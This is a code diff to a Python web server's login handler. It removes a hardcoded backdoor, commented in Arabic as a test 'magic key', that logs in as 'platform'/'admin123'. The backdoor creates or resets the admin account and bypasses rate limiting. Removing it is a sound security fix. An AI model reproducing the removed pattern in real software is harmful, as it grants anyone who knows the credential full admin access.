@@ -630,22 +630,6 @@ class Handler(BaseHTTPRequestHandler):
         ip = self.client_address[0]
         if route == ["login"] and method == "POST":
             name, pw = str(body.get("name", "")).strip(), str(body.get("password", ""))
-            # --- مفتاح الدخول السحري للتجربة ---
-            if name == "platform" and pw == "admin123":
-                row = c.execute("SELECT * FROM admins WHERE name='platform'").fetchone()
-                if not row:
-                    # لو مفيش أدمن في الداتابيز، نعمله فوراً
-                    salt = secrets.token_bytes(16)
-                    c.execute("INSERT INTO admins(name,salt,hash) VALUES('platform',?,?)", (salt, hash_pw("admin123", salt)))
-                    c.commit()
-                    row = c.execute("SELECT * FROM admins WHERE name='platform'").fetchone()
-                else:
-                    # لو موجود، نحدث الباسورد بتاعه لضمان الدخول
-                    salt = secrets.token_bytes(16)
-                    c.execute("UPDATE admins SET salt=?, hash=? WHERE name='platform'", (salt, hash_pw("admin123", salt)))
-                    c.commit()
-                return self.reply(200, {"ok": 1}, headers=self.start_session("a", row["id"], 0))
-            # ------------------------------------
             keys = (("ip", ip), ("admin", name.lower()))
             throttle(*keys)
             row = c.execute("SELECT * FROM admins WHERE name=?", (name,)).fetchone()
